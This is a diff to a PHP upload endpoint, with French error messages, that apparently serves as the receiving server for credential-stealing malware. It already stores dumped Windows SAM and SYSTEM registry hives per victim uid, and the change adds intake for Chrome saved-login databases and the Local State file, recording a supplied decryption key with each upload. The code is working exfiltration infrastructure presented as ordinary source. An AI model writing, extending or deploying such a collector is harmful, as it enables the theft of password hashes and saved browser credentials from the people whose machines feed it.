@@ -8,7 +8,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
     $uid = isset($_GET['uid']) ? $_GET['uid'] : null;
     $func_name = isset($_GET['func_name']) ? $_GET['func_name'] : null;
     $params = isset($_GET['params']) ? $_GET['params'] : null;
-    $filetype = "normal";
+    $decrypt_key = null;
+    $filetype = "text";
 
     if (!$uid || !$func_name) {
         echo "Erreur: il manque un ou plusieurs champs dans la requêtte";
@@ -25,11 +26,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
     $filename = $uid . "_" . time(); 
 
     if($func_name == "windowssam"){
-        $filename =  "sam.save";
+        $filename =  "sam_" . time() .".save";
         $filetype = "regedit";
     } elseif ($func_name == "windowssystem"){
-        $filename =  "system.save";
+        $filename =  "system_"  . time() . ".save";
         $filetype = "regedit";
+    } elseif ($func_name == "chromedata_logins") {
+        $filename =  "chromedata_logins_"  . time() . ".db";
+        $filetype = "chrome";
+        $decrypt_key = $params;
+    } elseif ($func_name=="chromedata_localstate"){
+        $filetype = "chrome";
+        $filename =  "chromedata_localstate_"  . time() . ".db";
+    } else {
+        echo "Erreur: Fonction non reconnue";
+        return;
+
     }
 
     $filePath = $user_dir . "/" . $filename;
@@ -52,12 +64,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
                 return;
             }
     
-            $sql = "INSERT INTO upload_files(uid, filename, filepath, file_type) VALUES(?,?,?,?)";
-            $stmt = $conn->prepare($sql);
-            $stmt->bind_param("ssss", $uid, $filename, $filePath, $filetype);
-            $stmt->execute();
+            if($decrypt_key != null){
+                $sql = "INSERT INTO upload_files(uid, filename, decryption_key, filepath, file_type) VALUES(?,?,?,?,?)";
+                $stmt = $conn->prepare($sql);
+                $stmt->bind_param("sssss", $uid, $filename, $decrypt_key, $filePath, $filetype);
+                $stmt->execute();
+            } else{
+                $sql = "INSERT INTO upload_files(uid, filename, filepath, file_type) VALUES(?,?,?,?)";
+                $stmt = $conn->prepare($sql);
+                $stmt->bind_param("ssss", $uid, $filename, $filePath, $filetype);
+                $stmt->execute();
+            }
     
-            echo "Fichier reçu et enregistré sous : " . $filename;
+            echo "Fichier reçu et enregistré ";
         } else {
             http_response_code(500);
             echo "Erreur lors de l'écriture du fichier.\n" . $filePath;
